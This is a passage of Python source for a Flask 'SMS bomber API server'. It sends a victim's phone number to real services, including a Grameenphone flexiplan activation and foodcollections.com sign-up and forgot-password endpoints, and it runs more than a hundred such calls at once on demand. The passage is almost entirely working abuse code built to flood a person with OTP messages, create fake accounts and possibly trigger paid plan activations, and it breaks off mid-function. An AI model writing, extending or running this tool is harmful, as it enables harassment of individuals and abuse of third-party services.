    Equivalent to api115.php:
    POST to gpwebms flexiplan activation.
    """
    url = "https://gpwebms.grameenphone.com/api/v1/flexiplan-purchase/activation"
    payload = {
        "payment_mode": "mobile_balance",
        "longevity": 7,
        "voice": 25,
        "data": 1536,
        "fourg": 0,
        "bioscope": 0,
        "sms": 0,
        "mca": 0,
        "msisdn": phone,
        "price": 73.34,
        "bundle_id": 26571,
        "is_login": False,
    }
    headers = {"Content-Type": "application/json"}
    try:
        resp = requests.post(url, json=payload, headers=headers)
        print(resp.text)
    except requests.RequestException as e:
        print("Error:", e)


def call_api116(phone: str) -> None:
    """
    Equivalent to api116.php:
    Sign-up then forgot-password on foodcollections.
    """
    # First request: sign-up
    url1 = "https://foodcollections.com/api/v1/auth/sign-up"
    random_suffix = "".join(random.choices(string.ascii_lowercase + string.digits, k=6))
    data1 = {
        "f_name": "korim",
        "l_name": "Mia",
        "phone": f"+88{phone}",
        "email": f"ryhr{phone}ehrdth{random_suffix}@gmail.com",
        "password": "boss2023",
        "ref_code": "",
    }
    try:
        resp1 = requests.post(url1, json=data1)
        print("Sign-up Response:", resp1.text)
    except requests.RequestException as e:
        print("Sign-up Error:", e)

    time.sleep(0.5)

    # Second request: forgot-password
    url2 = "https://foodcollections.com/api/v1/auth/forgot-password"
    data2 = {"phone": f"+88{phone}"}
    try:
        resp2 = requests.post(url2, json=data2)
        print("Forgot Password Response:", resp2.text)
    except requests.RequestException as e:
        print("Forgot Password Error:", e)


# Mapping of API numbers to functions
apis: dict[int, callable] = {
    1: call_api1,
    2: call_api2,
    3: call_api3,
    4: call_api4,
    5: call_api5,
    6: call_api6,
    7: call_api7,
    8: call_api8,
    9: call_api9,
    10: call_api10,
    11: call_api11,
    12: call_api12,
    13: call_api13,
    14: call_api14,
    15: call_api15,
    16: call_api16,
    17: call_api17,
    18: call_api18,
    19: call_api19,
    20: call_api20,
    21: call_api21,
    22: call_api22,
    23: call_api23,
    24: call_api24,
    25: call_api25,
    26: call_api26,
    27: call_api27,
    28: call_api28,
    29: call_api29,
    30: call_api30,
    31: call_api31,
    32: call_api32,
    33: call_api33,
    34: call_api34,
    35: call_api35,
    36: call_api36,
    37: call_api37,
    38: call_api38,
    39: call_api39,
    40: call_api40,
    41: call_api41,
    42: call_api42,
    43: call_api43,
    44: call_api44,
    45: call_api45,
    46: call_api46,
    47: call_api47,
    48: call_api48,
    49: call_api49,
    50: call_api50,
    51: call_api51,
    52: call_api52,
    53: call_api53,
    54: call_api54,
    55: call_api55,
    56: call_api56,
    57: call_api57,
    58: call_api58,
    59: call_api59,
    60: call_api60,
    61: call_api61,
    62: call_api62,
    63: call_api63,
    64: call_api64,
    65: call_api65,
    66: call_api66,
    67: call_api67,
    68: call_api68,
    69: call_api69,
    70: call_api70,
    71: call_api71,
    72: call_api72,
    73: call_api73,
    74: call_api74,
    75: call_api75,
    100: call_api100,
    101: call_api101,
    102: call_api102,
    103: call_api103,
    104: call_api104,
    105: call_api105,
    106: call_api106,
    107: call_api107,
    108: call_api108,
    109: call_api109,
    110: call_api110,
    111: call_api111,
    112: call_api112,
    113: call_api113,
    114: call_api114,
    115: call_api115,
    116: call_api116,
}


async def _run_apis_concurrently(phone: str, api_numbers: list[int]) -> list[dict]:
    """
    Run selected APIs concurrently in a thread pool and collect simple status.
    """
    loop = asyncio.get_running_loop()
    results: list[dict] = []

    def run_one(n: int, fn: callable) -> dict:
        print(f"\n--- Running API {n} ---")
        try:
            fn(phone)
            return {"api": n, "status": "ok"}
        except Exception as exc:  # noqa: BLE001
            print(f"API {n} crashed:", exc)
            return {"api": n, "status": "error", "error": str(exc)}

    tasks = [
        loop.run_in_executor(None, run_one, n, apis[n])
        for n in api_numbers
        if n in apis
    ]
    for result in await asyncio.gather(*tasks):
        results.append(result)
    return results


# Flask app so you can trigger APIs over HTTP.
app = Flask(__name__)


@app.get("/")
def index() -> "flask.Response":
    return jsonify(
        {
            "message": "SMS bomber API server",
            "endpoints": {
                "GET /run-all?number=...": {},
                "GET /run?number=...&apis=1,2,51": {},
                "POST /run-all": {"number": "string"},
                "POST /run": {
                    "number": "string",
                    "apis": "[int,...]  (optional, default = all)",
                },
            },
            "available_apis": sorted(apis.keys()),
        }
    )


@app.route("/run-all", methods=["GET", "POST"])
def http_run_all():
    if request.method == "GET":
        number = (request.args.get("number") or "").strip()
    else:
        body = request.get_json(silent=True) or {}
        number = (body.get("number") or "").strip()
    if not number:
        return jsonify({"error": "number is required"}), 400

    api_numbers = sorted(apis.keys())
    # Run all APIs concurrently (each in a thread) for maximum speed.
    results = asyncio.run(_run_apis_concurrently(number, api_numbers))

    return jsonify({"count": len(results), "results": results})


@app.route("/run", methods=["GET", "POST"])
def http_run_selected():
    if request.method == "GET":
        number = (request.args.get("number") or "").strip()
        apis_param = request.args.get("apis")
        if apis_param:
            requested = [p for p in apis_param.split(",") if p]
        else:
            requested = None
    else:
        body = request.get_json